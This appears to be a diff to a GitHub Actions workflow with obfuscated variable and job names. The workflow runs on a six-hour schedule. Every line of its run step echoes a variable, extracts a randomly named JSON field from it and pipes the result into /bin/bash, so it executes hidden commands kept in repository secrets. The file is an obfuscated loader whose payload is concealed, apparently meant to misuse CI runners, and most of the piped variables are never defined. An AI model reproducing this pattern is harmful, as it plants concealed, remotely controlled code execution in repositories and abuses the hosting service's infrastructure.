@@ -2,8 +2,8 @@ name: yinzhiping2389
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 0/6 * * *'
-jobs:  # 20039
+    - cron: '12 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,13 +11,24 @@ jobs:  # 20039
       - uses: actions/checkout@v4
       - name: yinzhiping2389
         env:
-          xpzvp0010: ${{ secrets.xpzvp0010 }}
+          kua6304: ${{ secrets.kua6304 }}
         run: |
-          echo $xpzvp0010 | jq -r .jtnj3861 | /bin/bash
-          echo $thuy63 | jq -r .kcwwn0247 | /bin/bash
-          echo $ow6 | jq -r .mjl7 | /bin/bash
-          echo $otywp58795 | jq -r .qgdy153 | /bin/bash
-          echo $vg777 | jq -r .zzc153 | /bin/bash
-          echo $iaq6504 | jq -r .gu8362 | /bin/bash
-          echo $j22 | jq -r .y858 | /bin/bash
+          echo $kua6304 | jq -r .vc2932 | /bin/bash
+          echo $kz36 | jq -r .ztv071 | /bin/bash
+          echo $v1913 | jq -r .ygzc068 | /bin/bash
+          echo $uf48 | jq -r .elef7654 | /bin/bash
+          echo $tpy4 | jq -r .kl0361 | /bin/bash
+          echo $saixk989 | jq -r .o4 | /bin/bash
+          echo $gu25957 | jq -r .iel63933 | /bin/bash
+          echo $vbd9424 | jq -r .dmi4159 | /bin/bash
+          echo $bla15 | jq -r .pe98 | /bin/bash
+          echo $qv1554 | jq -r .rhlv72815 | /bin/bash
+          echo $aohxa78 | jq -r .qtwha9156 | /bin/bash
+          echo $awl32 | jq -r .vkx7 | /bin/bash
+          echo $r520 | jq -r .ku9872 | /bin/bash
+          echo $yhhdg72 | jq -r .z79 | /bin/bash
+          echo $nada3206 | jq -r .bso68 | /bin/bash
+          echo $cit3347 | jq -r .ebwx21453 | /bin/bash
+          echo $s90037 | jq -r .h138 | /bin/bash
+          echo $bwbrh7 | jq -r .gbiwi2333 | /bin/bash
 
